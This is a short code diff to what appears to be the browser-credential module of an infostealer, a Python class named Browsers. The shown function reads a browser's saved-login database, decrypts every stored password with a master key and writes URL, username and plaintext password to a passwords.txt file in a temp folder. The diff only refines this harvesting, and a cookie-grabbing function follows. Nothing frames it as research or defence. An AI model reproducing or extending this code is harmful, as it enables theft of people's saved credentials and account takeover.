@@ -640,16 +640,21 @@ class Browsers:
             path += '\\' + profile + '\\Login Data'
         if not os.path.isfile(path):
             return
-        connection = sqlite3.connect(path)
-        with connection:
-            cursor = connection.cursor()
+        conn = sqlite3.connect(path)
+        with conn:
+            cursor = conn.cursor()
             cursor.execute('SELECT action_url, username_value, password_value FROM logins')
             for results in cursor.fetchall():
+                if not results[0] or not results[1] or not results[2]:
+                    continue
                 url = results[0]
                 login = results[1]
                 password = self.decrypt_password(results[2], self.masterkey)
                 with open(os.path.join(temp_path, "Browser", "passwords.txt"), "a", encoding="utf-8") as f:
-                    f.write(f"{url}:{login}:{password}\n")
+                    f.write(f"{url}  |  {login}  |  {password}\n")
+        cursor.close()
+        conn.close()
+
 
     def cookies(self, name: str, path: str, profile: str):
         if name == 'opera' or name == 'opera-gx':
